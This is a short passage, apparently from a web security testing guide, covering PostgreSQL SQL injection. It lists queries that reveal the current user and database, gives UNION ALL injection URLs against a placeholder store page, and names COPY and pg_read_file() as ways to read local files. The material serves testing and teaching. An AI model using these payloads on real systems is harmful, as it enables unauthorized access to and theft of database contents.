@@ -1,0 +1,25 @@
+ors
+Current User
+The identity of the current user can be retrieved with the following
+SQL SELECT statements:
+SELECT user
+SELECT current_user
+SELECT session_user
+SELECT usename FROM pg_user
+SELECT getpgusername()
+Examples:
+http:/www.example.com/store.php?id=1 UNION ALL SE-
+LECT user, NULL,NULL--
+http:/www.example.com/store.php?id=1 UNION ALL SE-
+LECT current_user, NULL, NULL--
+Current Database
+The built-in function current_database() returns the current da-
+tabase name.
+Example:
+http:/www.example.com/store.php?id=1 UNION ALL SE-
+LECT current_database(), NULL,NULL--
+Reading from a file
+PostgreSQL provides two ways to access a local file:
+» COPY statement
+» pg_read_file() internal function (starting from PostgreSQL 8.1)
+126
